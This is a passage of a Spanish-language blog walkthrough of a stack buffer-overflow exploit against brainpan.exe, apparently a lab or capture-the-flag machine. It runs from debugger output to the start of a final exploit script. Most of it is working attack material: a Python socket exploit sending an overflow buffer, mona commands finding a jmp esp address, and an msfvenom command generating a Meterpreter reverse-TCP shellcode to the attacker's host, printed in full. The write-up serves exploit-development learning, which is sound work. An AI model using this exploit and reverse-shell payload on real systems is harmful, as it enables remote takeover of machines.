</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">A 0  SS 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Z 0  DS 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">S 1  FS 0053 32bit 7EFDD000(FFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">T 0  GS 002B 32bit 0(FFFFFFFF)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">D 0
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">O 0  LastErr ERROR_SUCCESS (00000000)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EFL 00010286 (NO,NB,NE,A,S,PE,L,LE)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST0 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST1 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST2 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST3 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST4 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST5 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST6 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ST7 empty g
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">               3 2 1 0      E S P U O Z D I
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FST 0000  Cond 0 0 0 0  Err 0 0 0 0 0 0 0 0  (GT)
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FCW 037F  Prec NEAR,64  Mask    1 1 1 1 1 1
</span></span></span></code></pre></div><p>Vemos que el EIP se ha sobrescrito con 42424242. Ahora hay que averiguar cuales son los badchars que podrían afectar al shellcode.</p>
<h2 id="badchars">Badchars</h2>
<p>Para ello, voy a enviarle al programa una cadena de 1000 caracteres con todos los caracteres hexadecimales posibles:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{:02x}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(x), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print()
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 bytearray.py                                                        
</span></span><span style="display:flex;"><span>                                                                                                      
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>01<span style="color:#ae81ff">\x</span>02<span style="color:#ae81ff">\x</span>03<span style="color:#ae81ff">\x</span>04<span style="color:#ae81ff">\x</span>05<span style="color:#ae81ff">\x</span>06<span style="color:#ae81ff">\x</span>07<span style="color:#ae81ff">\x</span>08<span style="color:#ae81ff">\x</span>09<span style="color:#ae81ff">\x</span>0a<span style="color:#ae81ff">\x</span>0b<span style="color:#ae81ff">\x</span>0c<span style="color:#ae81ff">\x</span>0d<span style="color:#ae81ff">\x</span>0e<span style="color:#ae81ff">\x</span>0f<span style="color:#ae81ff">\x</span>10<span style="color:#ae81ff">\x</span>11<span style="color:#ae81ff">\x</span>12<span style="color:#ae81ff">\x</span>13<span style="color:#ae81ff">\x</span>14<span style="color:#ae81ff">\x</span>15<span style="color:#ae81ff">\x</span>16<span style="color:#ae81ff">\x</span>17<span style="color:#ae81ff">\x</span>18<span style="color:#ae81ff">\x</span>19<span style="color:#ae81ff">\x</span>1a<span style="color:#ae81ff">\x</span>1b<span style="color:#ae81ff">\x</span>1c<span style="color:#ae81ff">\x</span>1d<span style="color:#ae81ff">\x</span>1e<span style="color:#ae81ff">\x</span>1f<span style="color:#ae81ff">\x</span>20<span style="color:#ae81ff">\x</span>21<span style="color:#ae81ff">\x</span>22<span style="color:#ae81ff">\x</span>23<span style="color:#ae81ff">\x</span>24<span style="color:#ae81ff">\x</span>25<span style="color:#ae81ff">\x</span>26<span style="color:#ae81ff">\x</span>27<span style="color:#ae81ff">\x</span>28<span style="color:#ae81ff">\x</span>29<span style="color:#ae81ff">\x</span>2a<span style="color:#ae81ff">\x</span>2b<span style="color:#ae81ff">\x</span>2c<span style="color:#ae81ff">\x</span>2d<span style="color:#ae81ff">\x</span>2e<span style="color:#ae81ff">\x</span>2f<span style="color:#ae81ff">\x</span>30<span style="color:#ae81ff">\x</span>31<span style="color:#ae81ff">\x</span>32<span style="color:#ae81ff">\x</span>33<span style="color:#ae81ff">\x</span>34<span style="color:#ae81ff">\x</span>35<span style="color:#ae81ff">\x</span>36<span style="color:#ae81ff">\x</span>37<span style="color:#ae81ff">\x</span>38<span style="color:#ae81ff">\x</span>39<span style="color:#ae81ff">\x</span>3a<span style="color:#ae81ff">\x</span>3b<span style="color:#ae81ff">\x</span>3c<span style="color:#ae81ff">\x</span>3d<span style="color:#ae81ff">\x</span>3e<span style="color:#ae81ff">\x</span>3f<span style="color:#ae81ff">\x</span>40<span style="color:#ae81ff">\x</span>41<span style="color:#ae81ff">\x</span>42<span style="color:#ae81ff">\x</span>43<span style="color:#ae81ff">\x</span>44<span style="color:#ae81ff">\x</span>45<span style="color:#ae81ff">\x</span>46<span style="color:#ae81ff">\x</span>47<span style="color:#ae81ff">\x</span>48<span style="color:#ae81ff">\x</span>49<span style="color:#ae81ff">\x</span>4a<span style="color:#ae81ff">\x</span>4b<span style="color:#ae81ff">\x</span>4c<span style="color:#ae81ff">\x</span>4d<span style="color:#ae81ff">\x</span>4e<span style="color:#ae81ff">\x</span>4f<span style="color:#ae81ff">\x</span>50<span style="color:#ae81ff">\x</span>51<span style="color:#ae81ff">\x</span>52<span style="color:#ae81ff">\x</span>53<span style="color:#ae81ff">\x</span>54<span style="color:#ae81ff">\x</span>55<span style="color:#ae81ff">\x</span>56<span style="color:#ae81ff">\x</span>57<span style="color:#ae81ff">\x</span>58<span style="color:#ae81ff">\x</span>59<span style="color:#ae81ff">\x</span>5a<span style="color:#ae81ff">\x</span>5b<span style="color:#ae81ff">\x</span>5c<span style="color:#ae81ff">\x</span>5d<span style="color:#ae81ff">\x</span>5e<span style="color:#ae81ff">\x</span>5f<span style="color:#ae81ff">\x</span>60<span style="color:#ae81ff">\x</span>61<span style="color:#ae81ff">\x</span>62<span style="color:#ae81ff">\x</span>63<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\x</span>65<span style="color:#ae81ff">\x</span>66<span style="color:#ae81ff">\x</span>67<span style="color:#ae81ff">\x</span>68<span style="color:#ae81ff">\x</span>69<span style="color:#ae81ff">\x</span>6a<span style="color:#ae81ff">\x</span>6b<span style="color:#ae81ff">\x</span>6c<span style="color:#ae81ff">\x</span>6d<span style="color:#ae81ff">\x</span>6e<span style="color:#ae81ff">\x</span>6f<span style="color:#ae81ff">\x</span>70<span style="color:#ae81ff">\x</span>71<span style="color:#ae81ff">\x</span>72<span style="color:#ae81ff">\x</span>73<span style="color:#ae81ff">\x</span>74<span style="color:#ae81ff">\x</span>75<span style="color:#ae81ff">\x</span>76<span style="color:#ae81ff">\x</span>77<span style="color:#ae81ff">\x</span>78<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>7a<span style="color:#ae81ff">\x</span>7b<span style="color:#ae81ff">\x</span>7c<span style="color:#ae81ff">\x</span>7d<span style="color:#ae81ff">\x</span>7e<span style="color:#ae81ff">\x</span>7f<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>81<span style="color:#ae81ff">\x</span>82<span style="color:#ae81ff">\x</span>83<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>85<span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\x</span>87<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>8c<span style="color:#ae81ff">\x</span>8d<span style="color:#ae81ff">\x</span>8e<span style="color:#ae81ff">\x</span>8f<span style="color:#ae81ff">\x</span>90<span style="color:#ae81ff">\x</span>91<span style="color:#ae81ff">\x</span>92<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>95<span style="color:#ae81ff">\x</span>96<span style="color:#ae81ff">\x</span>97<span style="color:#ae81ff">\x</span>98<span style="color:#ae81ff">\x</span>99<span style="color:#ae81ff">\x</span>9a<span style="color:#ae81ff">\x</span>9b<span style="color:#ae81ff">\x</span>9c<span style="color:#ae81ff">\x</span>9d<span style="color:#ae81ff">\x</span>9e<span style="color:#ae81ff">\x</span>9f<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>a2<span style="color:#ae81ff">\x</span>a3<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>a5<span style="color:#ae81ff">\x</span>a6<span style="color:#ae81ff">\x</span>a7<span style="color:#ae81ff">\x</span>a8<span style="color:#ae81ff">\x</span>a9<span style="color:#ae81ff">\x</span>aa<span style="color:#ae81ff">\x</span>ab<span style="color:#ae81ff">\x</span>ac<span style="color:#ae81ff">\x</span>ad<span style="color:#ae81ff">\x</span>ae<span style="color:#ae81ff">\x</span>af<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>b1<span style="color:#ae81ff">\x</span>b2<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>b4<span style="color:#ae81ff">\x</span>b5<span style="color:#ae81ff">\x</span>b6<span style="color:#ae81ff">\x</span>b7<span style="color:#ae81ff">\x</span>b8<span style="color:#ae81ff">\x</span>b9<span style="color:#ae81ff">\x</span>ba<span style="color:#ae81ff">\x</span>bb<span style="color:#ae81ff">\x</span>bc<span style="color:#ae81ff">\x</span>bd<span style="color:#ae81ff">\x</span>be<span style="color:#ae81ff">\x</span>bf<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>c1<span style="color:#ae81ff">\x</span>c2<span style="color:#ae81ff">\x</span>c3<span style="color:#ae81ff">\x</span>c4<span style="color:#ae81ff">\x</span>c5<span style="color:#ae81ff">\x</span>c6<span style="color:#ae81ff">\x</span>c7<span style="color:#ae81ff">\x</span>c8<span style="color:#ae81ff">\x</span>c9<span style="color:#ae81ff">\x</span>ca<span style="color:#ae81ff">\x</span>cb<span style="color:#ae81ff">\x</span>cc<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>ce<span style="color:#ae81ff">\x</span>cf<span style="color:#ae81ff">\x</span>d0<span style="color:#ae81ff">\x</span>d1<span style="color:#ae81ff">\x</span>d2<span style="color:#ae81ff">\x</span>d3<span style="color:#ae81ff">\x</span>d4<span style="color:#ae81ff">\x</span>d5<span style="color:#ae81ff">\x</span>d6<span style="color:#ae81ff">\x</span>d7<span style="color:#ae81ff">\x</span>d8<span style="color:#ae81ff">\x</span>d9<span style="color:#ae81ff">\x</span>da<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>dc<span style="color:#ae81ff">\x</span>dd<span style="color:#ae81ff">\x</span>de<span style="color:#ae81ff">\x</span>df<span style="color:#ae81ff">\x</span>e0<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>e4<span style="color:#ae81ff">\x</span>e5<span style="color:#ae81ff">\x</span>e6<span style="color:#ae81ff">\x</span>e7<span style="color:#ae81ff">\x</span>e8<span style="color:#ae81ff">\x</span>e9<span style="color:#ae81ff">\x</span>ea<span style="color:#ae81ff">\x</span>eb<span style="color:#ae81ff">\x</span>ec<span style="color:#ae81ff">\x</span>ed<span style="color:#ae81ff">\x</span>ee<span style="color:#ae81ff">\x</span>ef<span style="color:#ae81ff">\x</span>f0<span style="color:#ae81ff">\x</span>f1<span style="color:#ae81ff">\x</span>f2<span style="color:#ae81ff">\x</span>f3<span style="color:#ae81ff">\x</span>f4<span style="color:#ae81ff">\x</span>f5<span style="color:#ae81ff">\x</span>f6<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>f9<span style="color:#ae81ff">\x</span>fa<span style="color:#ae81ff">\x</span>fb<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>fd<span style="color:#ae81ff">\x</span>fe<span style="color:#ae81ff">\x</span>ff
</span></span></code></pre></div><p>Preparo el script del exploit con el offset, el retn BBBB y el payload con los valores hexadecimales generados:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.56.101&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">519</span>
</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;BBBB&#34;</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>connect((ip, port))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
</span></span><span style="display:flex;"><span>  s<span style="color:#f92672">.</span>send(bytes(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;latin-1&#34;</span>))
</span></span><span style="display:flex;"><span>  print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><p>En Inmuinity Debugger añado el valor \x00 a un bytearray para ver si es un badchar:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona bytearray -b <span style="color:#e6db74">&#34;\x00&#34;</span>
</span></span></code></pre></div><p>Lanzo el exploit y comparo el bytearray con el payload enviado:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona compare -f C:<span style="color:#ae81ff">\m</span>ona<span style="color:#ae81ff">\b</span>rainpan<span style="color:#ae81ff">\\</span>bytearray.bin -a ESP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>mona Memory comparison results, item <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span> Address<span style="color:#f92672">=</span>0x0028f930
</span></span><span style="display:flex;"><span> Status<span style="color:#f92672">=</span>Unmodified
</span></span><span style="display:flex;"><span> BadChars<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span> Type<span style="color:#f92672">=</span>normal
</span></span><span style="display:flex;"><span> Location<span style="color:#f92672">=</span>Stack
</span></span></code></pre></div><p>Al comparar la dirección de memoria del ESP con el bytearray, vemos que no hay ningún badchar más que el \x00.</p>
<h2 id="punto-de-salto">Punto de salto</h2>
<p>El comando <code>!mona jmp -r esp -cpb &quot;\x00&quot;</code> nos devuelve una lista de direcciones de memoria que apuntan a un salto a la shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>!mona jmp -r esp -cpb <span style="color:#e6db74">&#34;\x00&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Log data, item <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span> Address<span style="color:#f92672">=</span>311712F3
</span></span><span style="display:flex;"><span> Message<span style="color:#f92672">=</span>  0x311712f3 : jmp esp |  <span style="color:#f92672">{</span>PAGE_EXECUTE_READ<span style="color:#f92672">}</span> <span style="color:#f92672">[</span>brainpan.exe<span style="color:#f92672">]</span> ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0- <span style="color:#f92672">(</span>C:<span style="color:#ae81ff">\b</span>of<span style="color:#ae81ff">\b</span>rainpan<span style="color:#ae81ff">\b</span>rainpan.exe<span style="color:#f92672">)</span>, 0x0
</span></span></code></pre></div><p>La dirección de memoria que apunta a un salto a la shellcode es 311712F3. Es necesario convertir la dirección de memoria a little endian para poder utilizarla en el exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;import struct; print(struct.pack(&#39;&lt;I&#39;, 0x311712F3))&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;\xf3\x12\x171&#39;</span>
</span></span></code></pre></div><p>Lo añado a la variable retn del exploit.</p>
<h2 id="shellcode">Shellcode</h2>
<p>Para generar la shellcode, voy a utilizar msfvenom:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.56.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>process -b <span style="color:#e6db74">&#34;\x00&#34;</span> -f c
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
</span></span><span style="display:flex;"><span>Found <span style="color:#ae81ff">12</span> compatible encoders
</span></span><span style="display:flex;"><span>Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">381</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">381</span>
</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">381</span> bytes
</span></span><span style="display:flex;"><span>Final size of c file: <span style="color:#ae81ff">1632</span> bytes
</span></span><span style="display:flex;"><span>unsigned char buf<span style="color:#f92672">[]</span> <span style="color:#f92672">=</span> 
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xd9\xc1\xb8\x35\x89\xc6\x94\xd9\x74\x24\xf4\x5b\x31\xc9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xb1\x59\x83\xeb\xfc\x31\x43\x15\x03\x43\x15\xd7\x7c\x3a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x7c\x98\x7f\xc3\x7d\xc6\xf6\x26\x4c\xd4\x6d\x22\xfd\xe8&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xe6\x66\x0e\x83\xab\x92\x01\x24\x01\xbd\x2c\xb5\x1d\xb3&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x66\x78\xe2\x98\x4b\x1b\x9e\xe2\x9f\xfb\x9f\x2c\xd2\xfa&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xd8\xfa\x98\x13\xb4\x77\x30\xfb\xb2\xca\x89\xfa\x14\x9d&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x7a\xbc\xec\xa7\xbd\x48\x41\xa9\xed\x3b\x01\x89\x86\x73&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xaa\x99\x99\x50\x4f\xd0\xee\x6a\x61\x1c\x47\x19\xb5\x69&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x59\xcb\x87\xad\xf6\x32\x28\x20\x06\x73\x8f\xdb\x7d\x8f&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xf3\x66\x86\x54\x89\xbc\x03\x4a\x29\x36\xb3\xae\xcb\x9b&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x22\x25\xc7\x50\x20\x61\xc4\x67\xe5\x1a\xf0\xec\x08\xcc&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x70\xb6\x2e\xc8\xd9\x6c\x4e\x49\x84\xc3\x6f\x89\x60\xbb&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xd5\xc2\x83\xaa\x6a\x2b\x5c\xd3\x36\xbb\x90\x1e\xc9\x3b&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbf\x29\xba\x09\x60\x82\x54\x21\xe9\x0c\xa2\x30\xfd\xae&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x7c\xfa\x6e\x51\x7d\xfa\xa7\x96\x29\xaa\xdf\x3f\x52\x21&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x20\xbf\x87\xdf\x2a\x57\xe8\xb7\x13\xa6\x80\xc5\x63\xb9&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x0c\x40\x85\xe9\xfc\x02\x1a\x4a\xad\xe2\xca\x22\xa7\xed&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x35\x52\xc8\x24\x5e\xf9\x27\x90\x36\x96\xde\xb9\xcd\x07&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x1e\x14\xa8\x08\x94\x9c\x4c\xc6\x5d\xd5\x5e\x3f\x3a\x15&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x9f\xc0\xaf\x15\xf5\xc4\x79\x42\x61\xc7\x5c\xa4\x2e\x38&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x8b\xb7\x29\xc6\x4a\x81\x42\xf1\xd8\xad\x3c\xfe\x0c\x2d&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xbd\xa8\x46\x2d\xd5\x0c\x33\x7e\xc0\x52\xee\x13\x59\xc7&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x11\x45\x0d\x40\x7a\x6b\x68\xa6\x25\x94\x5f\xb4\x22\x6a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x1d\x93\x8a\x02\xdd\xa3\x2a\xd2\xb7\x23\x7b\xba\x4c\x0b&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x74\x0a\xac\x86\xdd\x02\x27\x47\xaf\xb3\x38\x42\x71\x6d&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x38\x61\xaa\x9e\x43\x0a\x4d\x5f\xb4\x02\x2a\x60\xb4\x2a&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x4c\x5d\x62\x13\x3a\xa0\xb6\x20\x35\x97\x9b\x01\xdc\xd7&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\x88\x52\xf5&#34;</span>;
</span></span></code></pre></div><p>Actualizo el exploit, añado al padding 16 bytes de NOPs y la shellcode:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1921.168.1.110&#34;</span>
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">9999</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;k3ss &#34;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">519</span>
</span></span><span style="display:flex;"><span>overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>retn <span style="color:#f92672">=</span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf3\x12\x17\x31</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc1\xb8\x35\x89\xc6\x94\xd9\x74\x24\xf4\x5b\x31\xc9</span><span style="color:#e6db74">&#34;</span>
